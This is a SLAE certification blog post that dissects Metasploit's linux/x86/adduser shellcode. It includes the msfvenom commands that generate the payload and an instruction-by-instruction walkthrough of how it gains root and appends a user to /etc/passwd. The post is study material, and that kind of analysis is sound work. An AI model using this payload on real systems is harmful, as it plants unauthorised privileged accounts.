---
layout: post
title: SLAE Exercise 5 (part 3) - Add User
subtitle: Shellcode Analysis 3 - Add User
tags: [SLAE]
---

linux/x86/adduser
======

The final chosen shellcode to be used from msfvenom is the 'adduser' payload. This adds a user to the system that it is executed on. The parameters to be used for this payload can be seen with the following command:

    msfvenom -p linux/x86/adduser --payload-options
	
From this it can be seen that there are two required payloads:

![payloadoptions](https://raw.githubusercontent.com/14Deep/14deep.github.io/master/_posts/Images/EX5/part3/payloadoptions.png)

To keep things simple, these default options will be left, which should create the user with the username and password of 'metasploit'. The command that is used to create a payload that will create the new user is as below:

	msfvenom -p linux/x86/adduser  -f raw > adduserraw

Once this has been generated it can be disassembled using ndisasm to analyse the instructions used with the following command:

	ndisasm -b 32 ./adduserraw

![ndisasm](https://raw.githubusercontent.com/14Deep/14deep.github.io/master/_posts/Images/EX5/part3/ndisasm.png)


Stepping through the instructions
------

Each of the instructions seen here will be stepped through, describing what is happening at each step. 

**Setreuid**

int setgid(gid_t gid);

The 'setreuid' syscall sets the real and/or effective user or group ID of the calling process. As both values set are 0 the running process will have permissions to modify the 'passwd' file. 

```
Xor ecx, ecx - Clears the ecx register.

Mov ebx, ecx - Move 0 to the ebx register, clearing it.

Push byte +0x46 -	Pushes 70 to the stack.

Pop eax	Pop 70 from the stack into eax for the syscall 'setreuid'

Int 0x80 - An interupt which will call 'setreuid'.
```

**Open**

int open(const char *pathname, int flags, mode_t mode);

For this shellcode, the 'open' syscall is used to open the file that is to be written to in order to add the new user. This is the 'passwd' file found at '/etc/passwd. This can be seen in the below instructions pushed to the stack and then pointed to by ebx: 

```
Push byte +0x5 - Push 5 to the stack.

Pop eax - Pop 5 from the stack into eax for the 'open' syscall.

Xor ecx, ecx - Clear the ecx register.

Push ecx - Push 0 to the stack from the cleared ecx register.

Push dword 0x64777373 - These instructions push '/etc//passwd' to the stack.
Push dword 0x61702f2f	
Push dword 0x6374652f	

Mov ebx, esp - Move the stack pointer into ebx to be a pointer to the pathname to open.

Inc ecx - Increment ecx to be 1.

Mov ch, 0x4 - Move 4 to ch.

Int 0x80 - Interupt to call the 'open' syscall
```

**Write**

ssize_t write(int fd, const void *buf, size_t count);

The 'write' syscall is used to add the new user to the file that was opened previously. This is done using the returned file descriptor. The call value couldn't be completely observed within the disassembled code obtained from Ndisasm previosuly. From debugging the shellcode with GDB the following instuctions could be observed:

![writeinstructions](https://raw.githubusercontent.com/14Deep/14deep.github.io/master/_posts/Images/EX5/part3/realinstructions.png)

```
Xchg ebx, eax - Move the return value of the 'open' syscall into ebx. The return value is the file descriptor.

Call 0x80480a7 - Call 0x80480a7, which will start from the instruction 'pop ecx'. This is used as a call-pop to get the address of the value required onto the stack.

Insd - The following contain the value that is pointed to from using 'call', and so hold no significance as instructions. 
Gs jz 0x90	
Jnc 0xa1	
Insb	
Outsd	
Imul esi, [edx+edi+0x41], dword 0x49642f7a	
Jnc 0xa7	
Xor al, 0x70	
Xor al, 0x49	
Push edx	
Arpl [edx], di	
Xor [edx], bh	
Xor [edx], bh	
Cmp ch, [edi]	
Cmp ch, [edi]	
Bound ebp, [ecx+0x6e]	
Das	
Jnc 0xba	
Or bl, [ecx-0x75]	

pop ecx	- Move the pointer from 'call' into ecx for the required *buf parameter. 

mov edx, DWORD PTR [ecx-0x4] - Move the required count into edx, this call writes up to 'count' bytes from the buffer sepcified in ecx.

push 0x4 - Push 4 to the stack.

pop 0x4 - Pop 4 to eax to be used for the syscall 'write'.

Int 0x80 - Interupt to call the 'write' syscall.
```

**Exit**

The instructions for this section are as follows:

```
Push byte +0x1	Push 1 to the stack to be used for the exit syscall
Pop eax	Pop 1 to eax for the exit syscall
Int 0x80	Interupt calling the syscall to exit gracefully
```

Strace
------

Strace was utilised to observe the syscalls used and the parameters. The command used and screenshot of the output can be observed below:

    msfvenom -p linux/x86/adduser  -f elf > adduserelf

![Strace](https://raw.githubusercontent.com/14Deep/14deep.github.io/master/_posts/Images/EX5/part3/strace.png)


GDB
------

To observe the shellcode executing within GDB, the elf payload created will be analysed. The command used to create this code is as follows:

    msfvenom -p linux/x86/adduser  -f elf > adduserelf

With the created payload, there are no symbols within the binary and so 'readelf' has to be used to find the entry point for the binary. This can be run as follows:

    Readelf --headers ./adduserelf

The output of this is as below:

![readelf](https://raw.githubusercontent.com/14Deep/14deep.github.io/master/_posts/Images/EX5/part3/readelf.png)

As can be seen, the entrypoint in this instance would be the address '0x8048054'. This can now be observed within GDB when setting a breakpoint at this address and running the program:

![gdbinstructions](https://raw.githubusercontent.com/14Deep/14deep.github.io/master/_posts/Images/EX5/part3/gdbinstructions.png)


**Setreuid**

Just before the first syscall for 'setreuid', the registers were examined to determine if they were as would be expected from the earlier analysis:

![setreuid](https://raw.githubusercontent.com/14Deep/14deep.github.io/master/_posts/Images/EX5/part3/setreuidregisters.png)


**Open**

As part of the 'open' syscall 3 values are pushed to the stack which are subsequently pointed to within the ebx register. The instructions can be seen below:

![openpush](https://raw.githubusercontent.com/14Deep/14deep.github.io/master/_posts/Images/EX5/part3/openpush.png)

Once these have been pushed to the stack, the values can be observed:

![etcpasswd](https://raw.githubusercontent.com/14Deep/14deep.github.io/master/_posts/Images/EX5/part3/etcpasswd.png)

It is clear that '/etc//passwd' is pushed to the stack to be pointed to within ebx to be the file that will be written to. This is where the new user will be inserted. 

Interestingly here, 0x4 is moved into ch to change the value of ecx from 0x1 (1) to 0x401 (1025). This is for the 'flags' parameter of the syscall. The values of the registers before the syscall is called can also be observed within this screenshot. Note that the value of ebx is the same as esp and is pointing to the  '/etc//passwd' value discussed before:

![flags](https://raw.githubusercontent.com/14Deep/14deep.github.io/master/_posts/Images/EX5/part3/flags.png)


**Write**

The values of the registers before the next syscall 'write' are observed. The value in ebx is the file descriptor that was returned from the 'open' syscall, the ecx register will be discussed below, and the edx register contains the size to be written. This wasn't seen in the Ndisasm dissasembly and within GDB used the following instruction to get the required size:

    Mov edx, DWORD PTR [ecx-0x4]
	
The value pointed to within ecx is the pointer that was pushed to the stack when 'call' was used. It can be seen that this contains the values to write to the opened file:

![examineecx](https://raw.githubusercontent.com/14Deep/14deep.github.io/master/_posts/Images/EX5/part3/writepointer.png)

The values in the register before the syscall:

![writeregisters](https://raw.githubusercontent.com/14Deep/14deep.github.io/master/_posts/Images/EX5/part3/writesyscall.png)


**Exit**

The rest of the shellcode gracefully exits the program which will not require walking through. 



This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert Certification:

http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert

Student ID: 1092
